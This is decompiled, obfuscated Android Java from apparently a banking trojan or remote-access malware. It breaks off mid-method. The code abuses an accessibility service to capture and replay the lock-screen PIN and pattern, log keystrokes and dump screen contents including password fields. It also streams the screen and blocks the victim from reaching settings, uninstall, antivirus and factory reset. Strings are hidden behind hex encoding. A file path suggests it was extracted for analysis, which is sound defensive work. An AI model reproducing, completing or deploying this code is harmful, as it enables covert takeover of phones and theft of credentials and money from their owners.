package v.s;

import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Path;
import android.graphics.Rect;
import android.hardware.HardwareBuffer;
import android.media.AudioManager;
import android.media.MediaCodec;
import android.media.MediaCrypto;
import android.media.MediaFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Surface;
import android.view.accessibility.AccessibilityNodeInfo;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.Timer;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Pattern;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class GARjgaGEpTotOxcl8vfe {
    public static void A1BaTVAMeIXMnh(String str) {
        DataQFAdapter.capturedPattern = str;
    }

    public static void D5P1xCAyuvgF(AccessibilityNodeInfo accessibilityNodeInfo, JSONArray jSONArray, int i) {
        String string;
        String string2;
        String string3;
        if (i > 20 || jSONArray.length() > 300) {
            return;
        }
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            String str = "";
            if (text == null || (string = text.toString()) == null) {
                string = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                string2 = "";
            }
            String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
            if (viewIdResourceName == null) {
                viewIdResourceName = "";
            }
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className != null && (string3 = className.toString()) != null) {
                str = string3;
            }
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            if (string.length() > 0 || string2.length() > 0 || accessibilityNodeInfo.isEditable() || accessibilityNodeInfo.isPassword() || accessibilityNodeInfo.isClickable()) {
                JSONObject jSONObject = new JSONObject();
                if (string.length() > 0) {
                    jSONObject.put("t", string);
                }
                if (string2.length() > 0) {
                    jSONObject.put("d", string2);
                }
                if (viewIdResourceName.length() > 0) {
                    jSONObject.put("id", viewIdResourceName);
                }
                if (str.length() > 0) {
                    jSONObject.put(TypefaceCache.obtain("0020007A0048"), KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(str, str));
                }
                if (accessibilityNodeInfo.isPassword()) {
                    jSONObject.put(TypefaceCache.obtain("00330061005F"), true);
                }
                if (accessibilityNodeInfo.isEditable()) {
                    jSONObject.put(TypefaceCache.obtain("0026007200520093"), true);
                }
                if (accessibilityNodeInfo.isClickable()) {
                    jSONObject.put(TypefaceCache.obtain("0020007A0052008400FB"), true);
                }
                jSONObject.put("b", rect.left + "," + rect.top + "," + rect.right + "," + rect.bottom);
                jSONArray.put(jSONObject);
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    try {
                        D5P1xCAyuvgF(child, jSONArray, i + 1);
                        try {
                            child.recycle();
                        } catch (Throwable unused) {
                        }
                    } catch (Throwable th) {
                        try {
                            child.recycle();
                        } catch (Throwable unused2) {
                        }
                        throw th;
                    }
                }
            }
        } catch (Throwable unused3) {
        }
    }

    public static boolean DVTNwpDEVsUKuznof(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        String string2;
        String string3;
        if (i <= 15) {
            try {
                CharSequence className = accessibilityNodeInfo.getClassName();
                String lowerCase = "";
                if (className == null || (string = className.toString()) == null) {
                    string = "";
                }
                if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("000F00790058008C00C000BE00C600B300260064005500B100F900BA00C5"), true) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("00130077004F009300F500AD00DC0091002A0073004C"), true)) {
                    Rect rect = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect);
                    if (rect.width() > 100 && rect.height() > 100) {
                        DataQFAdapter.lastPatternViewBounds = rect;
                        String unused = DataQFAdapter.TAG;
                        TypefaceCache.obtain("00130077004F009300F500AD00DC00E70035007F005E009000B000BD00DD00B2002D0072004800C700F600B000C700A900270036004D008E00F100FF00D100AB00220065004800DD00B0");
                        rect.toString();
                    }
                } else {
                    CharSequence text = accessibilityNodeInfo.getText();
                    String lowerCase2 = (text == null || (string3 = text.toString()) == null) ? "" : string3.toLowerCase(Locale.ROOT);
                    CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                    if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                        lowerCase = string2.toLowerCase(Locale.ROOT);
                    }
                    String str = lowerCase2 + " " + lowerCase;
                    if (!KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.checked("04700456040B04A304A80498048704860479042E040200C704AA04E404FC0480"), false) && !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.obtain("00270064005A009000B000AF00D300B30037007300490089"), false) && !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.obtain("00270064005A009000B000AA00DC00AB002C0075005000C700E000BE00C600B3002600640055"), false) && !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.checked("04710424040E04D304A8049D048700E704700456040B04A304A80498048704860479042E0402"), false) && !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.checked("047E0426047B04DF04D1049C048B048504760036040804A704A0049B048A048004760457040104DF04A9"), false)) {
                        int childCount = accessibilityNodeInfo.getChildCount();
                        for (int i2 = 0; i2 < childCount; i2++) {
                            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                            if (child != null) {
                                boolean zDVTNwpDEVsUKuznof = DVTNwpDEVsUKuznof(child, i + 1);
                                child.recycle();
                                if (zDVTNwpDEVsUKuznof) {
                                }
                            }
                        }
                    }
                }
                return true;
            } catch (Exception unused2) {
            }
        }
        return false;
    }

    public static void ECwLkmPW1UKz7J6E(Context context) {
        PackageManager packageManager = context.getPackageManager();
        LinkedHashMap linkedHashMap = new LinkedHashMap();
        ConcurrentHashMap.KeySetView keySetView = DataQFAdapter.grabberPackages;
        ArrayList arrayList = new ArrayList();
        for (Object obj : keySetView) {
            String str = (String) obj;
            Set set = DataQFAdapter.noPinOverlayPrefixes;
            if (set == null || !set.isEmpty()) {
                Iterator it = set.iterator();
                do {
                    if (it.hasNext()) {
                    }
                } while (!str.startsWith((String) it.next()));
            }
            arrayList.add(obj);
        }
        int size = arrayList.size();
        int i = 0;
        while (i < size) {
            Object obj2 = arrayList.get(i);
            i++;
            String str2 = (String) obj2;
            try {
                linkedHashMap.put(str2, packageManager.getApplicationLabel(packageManager.getApplicationInfo(str2, 0)).toString());
            } catch (Throwable unused) {
            }
        }
        DataQFAdapter.pinCaptureAppNames.clear();
        DataQFAdapter.pinCaptureAppNames.putAll(linkedHashMap);
        for (String str3 : linkedHashMap.keySet()) {
            if (!DataQFAdapter.pinCaptureEnabled.containsKey(str3)) {
                DataQFAdapter.pinCaptureEnabled.put(str3, Boolean.valueOf(DataQFAdapter.autoEnablePinPackages.contains(str3)));
            }
        }
        k84rwRrqzhrNQ1CdNQ9();
    }

    public static boolean EWUjsTERgdPbSw3NNlN() {
        DataQFAdapter dataQFAdapter;
        if (Build.VERSION.SDK_INT < 28 || (dataQFAdapter = DataQFAdapter.instance) == null) {
            return false;
        }
        return dataQFAdapter.performGlobalAction(8);
    }

    public static void Ee8d2j4S9Vm5yGuR() {
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter != null) {
            dataQFAdapter.performGlobalAction(52 - 37);
        }
    }

    public static boolean GiffeZJ1rbwyx() {
        DataQFAdapter dataQFAdapter;
        if (Build.VERSION.SDK_INT < 95 - 67 || (dataQFAdapter = DataQFAdapter.instance) == null) {
            return false;
        }
        return dataQFAdapter.performGlobalAction(9);
    }

    /* JADX WARN: Code duplicated, block: B:45:0x007b A[Catch: Exception -> 0x0130, TRY_ENTER, TryCatch #0 {Exception -> 0x0130, blocks: (B:5:0x000a, B:8:0x0012, B:11:0x0019, B:13:0x0026, B:16:0x0038, B:18:0x003f, B:45:0x007b, B:47:0x0081, B:49:0x0087, B:51:0x0091, B:53:0x0098, B:55:0x009e, B:57:0x00a7, B:59:0x00af, B:61:0x00b5, B:62:0x00bb, B:64:0x00df, B:66:0x00eb, B:68:0x00f7, B:70:0x0103, B:73:0x0110, B:75:0x0118, B:78:0x0120), top: B:85:0x000a }] */
    /* JADX WARN: Code duplicated, block: B:50:0x008f  */
    /* JADX WARN: Code duplicated, block: B:56:0x00a5  */
    /* JADX WARN: Code duplicated, block: B:75:0x0118 A[Catch: Exception -> 0x0130, TryCatch #0 {Exception -> 0x0130, blocks: (B:5:0x000a, B:8:0x0012, B:11:0x0019, B:13:0x0026, B:16:0x0038, B:18:0x003f, B:45:0x007b, B:47:0x0081, B:49:0x0087, B:51:0x0091, B:53:0x0098, B:55:0x009e, B:57:0x00a7, B:59:0x00af, B:61:0x00b5, B:62:0x00bb, B:64:0x00df, B:66:0x00eb, B:68:0x00f7, B:70:0x0103, B:73:0x0110, B:75:0x0118, B:78:0x0120), top: B:85:0x000a }] */
    /* JADX WARN: Code duplicated, block: B:77:0x011e  */
    /* JADX WARN: Code duplicated, block: B:78:0x0120 A[Catch: Exception -> 0x0130, TRY_LEAVE, TryCatch #0 {Exception -> 0x0130, blocks: (B:5:0x000a, B:8:0x0012, B:11:0x0019, B:13:0x0026, B:16:0x0038, B:18:0x003f, B:45:0x007b, B:47:0x0081, B:49:0x0087, B:51:0x0091, B:53:0x0098, B:55:0x009e, B:57:0x00a7, B:59:0x00af, B:61:0x00b5, B:62:0x00bb, B:64:0x00df, B:66:0x00eb, B:68:0x00f7, B:70:0x0103, B:73:0x0110, B:75:0x0118, B:78:0x0120), top: B:85:0x000a }] */
    /* JADX WARN: Code duplicated, block: B:90:0x012f A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:92:0x012c A[SYNTHETIC] */
    public static boolean H9XlUr4OeMJFiXK(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        CharSequence text;
        String lowerCase;
        CharSequence contentDescription;
        String lowerCase2;
        CharSequence hintText;
        String str;
        int childCount;
        int i2;
        AccessibilityNodeInfo child;
        boolean zH9XlUr4OeMJFiXK;
        String string2;
        String string3;
        String string4;
        int inputType;
        if (i <= 15) {
            try {
                CharSequence className = accessibilityNodeInfo.getClassName();
                String lowerCase3 = "";
                if (className == null || (string = className.toString()) == null) {
                    string = "";
                }
                if (!KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("000800730042008000E500BE00C000A3001300770048009400E700B000C000A30015007F005E0090"), true) && !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("001300770048009400E700B000C000A3001700730043009300C600B600D700B0"), true)) {
                    if (accessibilityNodeInfo.isEditable() && accessibilityNodeInfo.isFocused()) {
                        try {
                            inputType = accessibilityNodeInfo.getInputType();
                        } catch (Exception unused) {
                            inputType = 0;
                        }
                        int i3 = inputType & 15;
                        boolean z = i3 == 1;
                        boolean z2 = ((inputType & 128) == 0 && (inputType & 144) == 0 && (inputType & 224) == 0) ? false : true;
                        boolean z3 = i3 == 2;
                        if ((!z || z3) && !z2) {
                            text = accessibilityNodeInfo.getText();
                            if (text != null) {
                                lowerCase = "";
                            } else {
                                lowerCase = "";
                            }
                            contentDescription = accessibilityNodeInfo.getContentDescription();
                            if (contentDescription != null) {
                                lowerCase2 = "";
                            } else {
                                lowerCase2 = "";
                            }
                            hintText = accessibilityNodeInfo.getHintText();
                            if (hintText != null) {
                                lowerCase3 = string2.toLowerCase(Locale.ROOT);
                            }
                            str = lowerCase + " " + lowerCase2 + " " + lowerCase3;
                            if (!KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.checked("04710424040E04D304A8049D048700E7047C0426047B04D904AB0493"), false)) {
                                childCount = accessibilityNodeInfo.getChildCount();
                                for (i2 = 0; i2 < childCount; i2++) {
                                    child = accessibilityNodeInfo.getChild(i2);
                                    if (child == null) {
                                        zH9XlUr4OeMJFiXK = H9XlUr4OeMJFiXK(child, i + 1);
                                        child.recycle();
                                        if (zH9XlUr4OeMJFiXK) {
                                        }
                                    }
                                }
                            }
                        }
                    } else {
                        text = accessibilityNodeInfo.getText();
                        if (text != null || (string4 = text.toString()) == null) {
                            lowerCase = "";
                        } else {
                            lowerCase = string4.toLowerCase(Locale.ROOT);
                        }
                        contentDescription = accessibilityNodeInfo.getContentDescription();
                        if (contentDescription != null || (string3 = contentDescription.toString()) == null) {
                            lowerCase2 = "";
                        } else {
                            lowerCase2 = string3.toLowerCase(Locale.ROOT);
                        }
                        hintText = accessibilityNodeInfo.getHintText();
                        if (hintText != null && (string2 = hintText.toString()) != null) {
                            lowerCase3 = string2.toLowerCase(Locale.ROOT);
                        }
                        str = lowerCase + " " + lowerCase2 + " " + lowerCase3;
                        if (!KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.checked("04710424040E04D304A8049D048700E7047C0426047B04D904AB0493"), false) && !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.obtain("00260078004F008200E200FF00C200A600300065004C008800E200BB"), false) && !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.obtain("0037006F004B008200B000AF00D300B4003000610054009500F4"), false) && !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.obtain("00260078004F008200E200FF00CB00A800360064001B009700F100AC00C100B0002C0064005F"), false) && !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.checked("047C0426047B04D904AB0493009204F604780428040104DF04D004E1048004FD047B"), false)) {
                            childCount = accessibilityNodeInfo.getChildCount();
                            while (i2 < childCount) {
                                child = accessibilityNodeInfo.getChild(i2);
                                if (child == null) {
                                    zH9XlUr4OeMJFiXK = H9XlUr4OeMJFiXK(child, i + 1);
                                    child.recycle();
                                    if (zH9XlUr4OeMJFiXK) {
                                    }
                                }
                            }
                        }
                    }
                }
                return true;
            } catch (Exception unused2) {
            }
        }
        return false;
    }

    public static void JW3Lh9hxwLsO2ArTlH(long j) {
        DataQFAdapter.protectionBypassUntil = System.currentTimeMillis() + j;
        String unused = DataQFAdapter.TAG;
        TypefaceCache.obtain("00020078004F008E00BD00AA00DC00AE002D0065004F008600FC00B3009200A5003A0066005A009400E300FF00D400A800310036");
        long j2 = j / ((long) 1000);
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter != null) {
            dataQFAdapter.removeShadeBarrier();
        }
        DataQFAdapter.rearmHandler.removeCallbacksAndMessages(null);
        DataQFAdapter.rearmHandler.postDelayed(new jdOQeRk37T35X5xKW1P(5), j + ((long) 500));
    }

    public static void JXn4Qf7zpnLjP5(String str) {
        if (DataQFAdapter.lockScreenPackages.contains(str) && DataQFAdapter.capturedPattern.length() <= 0 && !DataQFAdapter.patternOverlayShowing && !DataQFAdapter.patternReplayInProgress) {
            String str2 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
            if (vbdyByOHPJmeGXlq.b1EoSIRjJHO5 || vbdyByOHPJmeGXlq.iUQk66nAiXgO35) {
                return;
            }
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (jCurrentTimeMillis - DataQFAdapter.lastPatternCaptureTime >= 15000 && jCurrentTimeMillis - DataQFAdapter.lastPatternCheck >= 3000) {
                DataQFAdapter.lastPatternCheck = jCurrentTimeMillis;
                DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
                if (dataQFAdapter == null) {
                    return;
                }
                try {
                    AccessibilityNodeInfo rootInActiveWindow = dataQFAdapter.getRootInActiveWindow();
                    if (rootInActiveWindow == null) {
                        return;
                    }
                    boolean zDVTNwpDEVsUKuznof = DVTNwpDEVsUKuznof(rootInActiveWindow, 0);
                    rootInActiveWindow.recycle();
                    if (zDVTNwpDEVsUKuznof) {
                        String unused = DataQFAdapter.TAG;
                        TypefaceCache.obtain("00130077004F009300F500AD00DC00E7002F00790058008C00B000AC00D100B500260073005500C700F400BA00C600A200200062005E008300B000B900C000A8002E0036");
                        TypefaceCache.obtain("006F00360048008F00FF00A800DB00A9002400360058008600E000AB00C700B5002600360054009100F500AD00DE00A6003A");
                        VEkRsTDS6a9oHWI();
                    }
                } catch (Exception e) {
                    String unused2 = DataQFAdapter.TAG;
                    TypefaceCache.obtain("0020007E005E008400FB008F00D300B3003700730049008900DC00B000D100AC001000750049008200F500B1009200A2003100640054009500AA00FF");
                    e.getMessage();
                }
            }
        }
    }

    public static boolean K7eEOBPYP9VIoHWTe(Context context) {
        String string = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
        return string != null && KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, context.getPackageName(), false);
    }

    public static JSONObject MLSIo1htfMPWeB8V876L() throws JSONException {
        JSONObject jSONObject = new JSONObject();
        String strObtain = TypefaceCache.obtain("0030007E005A008300F5");
        DataQFAdapter.Companion.getClass();
        jSONObject.put(strObtain, DataQFAdapter.UIBlock_Shade);
        jSONObject.put(TypefaceCache.obtain("00300073004F0093"), DataQFAdapter.UIBlock_Sett);
        jSONObject.put(TypefaceCache.obtain("00220027000A009E"), DataQFAdapter.UIBlock_A11y);
        jSONObject.put(TypefaceCache.obtain("00330079004C008200E2"), DataQFAdapter.UIBlock_Power);
        jSONObject.put(TypefaceCache.obtain("0036007800520089"), DataQFAdapter.UIBlock_Unin);
        jSONObject.put(TypefaceCache.obtain("002C00610055008600E000AF"), DataQFAdapter.UIBlock_OwnApp);
        jSONObject.put(TypefaceCache.obtain("0033007A005A009E"), DataQFAdapter.UIBlock_Play);
        jSONObject.put("av", DataQFAdapter.UIBlock_AV);
        jSONObject.put(TypefaceCache.obtain("002100640054009000E300BA00C0"), DataQFAdapter.UIBlock_Browser);
        jSONObject.put(TypefaceCache.obtain("0025007F0057008200E3"), DataQFAdapter.UIBlock_Files);
        jSONObject.put(TypefaceCache.obtain("003100730048008200E4"), DataQFAdapter.UIBlock_Reset);
        jSONObject.put(TypefaceCache.obtain("00270073004D"), DataQFAdapter.UIBlock_Dev);
        jSONObject.put(TypefaceCache.obtain("002D0073004F"), DataQFAdapter.UIBlock_Net);
        jSONObject.put(TypefaceCache.obtain("003100730058008200FE00AB00C1"), DataQFAdapter.UIBlock_Recents);
        jSONObject.put(TypefaceCache.obtain("002F00790058008C"), DataQFAdapter.UIBlock_Lock);
        return jSONObject;
    }

    public static boolean MSGkxvPxRYNqC(String str) {
        if (!DataQFAdapter.grabberPackages.contains(str)) {
            return false;
        }
        Set set = DataQFAdapter.noPinOverlayPrefixes;
        if (set != null && set.isEmpty()) {
            return true;
        }
        Iterator it = set.iterator();
        while (it.hasNext()) {
            if (str.startsWith((String) it.next())) {
                return false;
            }
        }
        return true;
    }

    public static boolean UoxIZOBVZaubOFdPNaXK(String str) {
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null) {
            return false;
        }
        if (str == null) {
            str = DataQFAdapter.capturedPattern;
        }
        if (str.length() == 0) {
            return false;
        }
        new Thread(new PbcIoTfr9OdE(dataQFAdapter, str, 1)).start();
        return true;
    }

    public static void VEkRsTDS6a9oHWI() {
        if (DataQFAdapter.patternOverlayShowing || DataQFAdapter.patternReplayInProgress) {
            return;
        }
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        Context applicationContext = dataQFAdapter != null ? dataQFAdapter.getApplicationContext() : null;
        if (applicationContext == null) {
            return;
        }
        DataQFAdapter.patternOverlayShowing = true;
        DataQFAdapter.lastPatternCaptureTime = System.currentTimeMillis();
        int i = 0;
        try {
            String str = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
            apQOLJtARzrH apqoljtarzrh = new apQOLJtARzrH(applicationContext, i);
            DataQFAdapter.Companion.getClass();
            DataQFAdapter dataQFAdapter2 = DataQFAdapter.instance;
            if (dataQFAdapter2 == null) {
                TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E9008C00D700B50035007F0058008200B000B100DD00B300630077004D008600F900B300D300A5002F0073001B008100FF00AD009200B700220062004F008200E200B1009200A400220066004F009200E200BA");
                apqoljtarzrh.pyu8ovAipBTLYAiKab(qkzRt1s9DJNNYwsqt.w9sT1Swbhx3hs);
            } else {
                vbdyByOHPJmeGXlq.XuO9PPFo607ssKwZjNW = apqoljtarzrh;
                vbdyByOHPJmeGXlq.Qrz92kRPw4GcghAc.post(new A68NpXPqwTFos99nt(dataQFAdapter2, 22, apqoljtarzrh));
            }
        } catch (Exception e) {
            String unused = DataQFAdapter.TAG;
            TypefaceCache.obtain("0030007E0054009000C000BE00C600B300260064005500A400F100AF00C600B2003100730074009100F500AD00DE00A6003A0036005E009500E200B000C000FD0063");
            e.getMessage();
            DataQFAdapter.patternOverlayShowing = false;
        }
    }

    public static boolean XuO9PPFo607ssKwZjNW() {
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null) {
            return false;
        }
        yI1KTRoNlsjx realScreenSize = dataQFAdapter.getRealScreenSize();
        int iIntValue = ((Number) realScreenSize.w9sT1Swbhx3hs).intValue();
        int iIntValue2 = ((Number) realScreenSize.vekpFI4d1Nc4fakF).intValue();
        int i = iIntValue / 2;
        int i2 = (iIntValue2 * 3) / 4;
        int i3 = iIntValue2 / 4;
        DataQFAdapter dataQFAdapter2 = DataQFAdapter.instance;
        if (dataQFAdapter2 != null) {
            return dataQFAdapter2.performSwipe(i, i2, i, i3, 300L);
        }
        return false;
    }

    public static boolean YIgR6F2ZXmLx2ul(GARjgaGEpTotOxcl8vfe gARjgaGEpTotOxcl8vfe, int i, int i2, int i3, int i4) {
        gARjgaGEpTotOxcl8vfe.getClass();
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter != null) {
            return dataQFAdapter.performSwipe(i, i2, i3, i4, 300L);
        }
        return false;
    }

    public static void Yrf7mWjzxCbCCUcSPwXl(String str) {
        String lowerCase = str.toLowerCase(Locale.ROOT);
        DataQFAdapter.lockedApps.remove(lowerCase);
        DataQFAdapter.autoLockedApps.remove(lowerCase);
    }

    public static boolean ajrMZmky8AIb2Pr(String str) {
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null) {
            return false;
        }
        if (str == null) {
            str = DataQFAdapter.capturedPin;
        }
        if (str.length() == 0) {
            return false;
        }
        new Thread(new PbcIoTfr9OdE(dataQFAdapter, str, (-18) + 20)).start();
        return true;
    }

    public static void bbLLF31we2Iu(String str) {
        DataQFAdapter.blockedApps.remove(str.toLowerCase(Locale.ROOT));
    }

    public static void dQC4QhgRN3MSEAP3HW0() {
        DataQFAdapter.isScreenStreaming = false;
        DataQFAdapter.h264CaptureInFlight = false;
        DataQFAdapter.lastCaptureTsMs = 0L;
        DataQFAdapter.latestFrame.set(null);
        Bitmap bitmap = DataQFAdapter.prevHwBitmap;
        if (bitmap != null) {
            bitmap.recycle();
        }
        DataQFAdapter.prevHwBitmap = null;
        try {
            HardwareBuffer hardwareBuffer = DataQFAdapter.prevHardwareBuffer;
            if (hardwareBuffer != null) {
                hardwareBuffer.close();
            }
        } catch (Exception unused) {
        }
        DataQFAdapter.prevHardwareBuffer = null;
        lLybWDNhgEj7LwIe llybwdnhgej7lwie = DataQFAdapter.hwEncoder;
        if (llybwdnhgej7lwie != null && llybwdnhgej7lwie.vekpFI4d1Nc4fakF.getAndSet(false)) {
            Thread thread = llybwdnhgej7lwie.JXn4Qf7zpnLjP5;
            if (thread != null) {
                thread.interrupt();
            }
            llybwdnhgej7lwie.JXn4Qf7zpnLjP5 = null;
            try {
                MediaCodec mediaCodec = llybwdnhgej7lwie.dDIMxZXP1V8HdM;
                if (mediaCodec != null) {
                    mediaCodec.signalEndOfInputStream();
                }
                MediaCodec mediaCodec2 = llybwdnhgej7lwie.dDIMxZXP1V8HdM;
                if (mediaCodec2 != null) {
                    mediaCodec2.stop();
                }
                MediaCodec mediaCodec3 = llybwdnhgej7lwie.dDIMxZXP1V8HdM;
                if (mediaCodec3 != null) {
                    mediaCodec3.release();
                }
            } catch (Exception unused2) {
            }
            Surface surface = llybwdnhgej7lwie.w9sT1Swbhx3hs;
            if (surface != null) {
                surface.release();
            }
            llybwdnhgej7lwie.w9sT1Swbhx3hs = null;
            llybwdnhgej7lwie.dDIMxZXP1V8HdM = null;
            llybwdnhgej7lwie.Ee8d2j4S9Vm5yGuR.clear();
            TypefaceCache.obtain("001000620054009700E000BA00D6");
        }
        DataQFAdapter.hwEncoder = null;
        DataQFAdapter.streamRestartCount = 0;
    }

    public static void dTS0S7eC32ubQH54j36(DataQFAdapter dataQFAdapter) {
        String str = "";
        try {
            String string = dataQFAdapter.getSharedPreferences(TypefaceCache.obtain("00270073004D008E00F300BA00ED00B7002A0078"), 0).getString(TypefaceCache.obtain("0033007F0055"), "");
            if (string == null) {
                string = "";
            }
            if (string.length() > 0) {
                DataQFAdapter.capturedPin = string;
                String unused = DataQFAdapter.TAG;
                TypefaceCache.obtain("000F0079005A008300F500BB009200B400220060005E008300B0008F00FB008900790036");
                TypefaceCache.obtain("006300720052008000F900AB00C1");
            }
        } catch (Exception unused2) {
        }
        try {
            String string2 = dataQFAdapter.getSharedPreferences(TypefaceCache.obtain("00270073004D008E00F300BA00ED00B7002A0078"), 0).getString(TypefaceCache.obtain("00330077004F009300F500AD00DC"), "");
            if (string2 != null) {
                str = string2;
            }
            if (str.length() > 0) {
                DataQFAdapter.capturedPattern = str;
                String unused3 = DataQFAdapter.TAG;
                TypefaceCache.obtain("000F0079005A008300F500BB009200B400220060005E008300B000AF00D300B3003700730049008900AA00FF");
                TypefaceCache.obtain("00630075005E008B00FC00AC");
            }
        } catch (Exception unused4) {
        }
    }

    public static void euF5Udt5Rqv3Qmea(boolean z) {
        DataQFAdapter.liveKeylogEnabled = z;
    }

    public static Rect fivkjwgu2UdAtiY(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        try {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("000F00790058008C00C000BE00C600B300260064005500B100F900BA00C5"), true) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("00130077004F009300F500AD00DC0091002A0073004C"), true)) {
                Rect rect = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect);
                if (rect.width() > 100 && rect.height() > 100) {
                    return rect;
                }
            }
            if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("000800730042008000E500BE00C000A300130077004F009300F500AD00DC0091002A0073004C"), true)) {
                Rect rect2 = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect2);
                if (rect2.width() > 200 && rect2.height() > 200) {
                    return rect2;
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    Rect rectFivkjwgu2UdAtiY = fivkjwgu2UdAtiY(child);
                    child.recycle();
                    if (rectFivkjwgu2UdAtiY != null) {
                        return rectFivkjwgu2UdAtiY;
                    }
                }
            }
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    public static AccessibilityNodeInfo gIIiyi2ddlMDR0(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        String string2;
        if (i > 15) {
            return null;
        }
        try {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className != null) {
                className.toString();
            }
            CharSequence text = accessibilityNodeInfo.getText();
            String lowerCase = (text == null || (string2 = text.toString()) == null) ? "" : string2.toLowerCase(Locale.ROOT);
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            String lowerCase2 = (contentDescription == null || (string = contentDescription.toString()) == null) ? "" : string.toLowerCase(Locale.ROOT);
            String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
            String lowerCase3 = viewIdResourceName != null ? viewIdResourceName.toLowerCase(Locale.ROOT) : "";
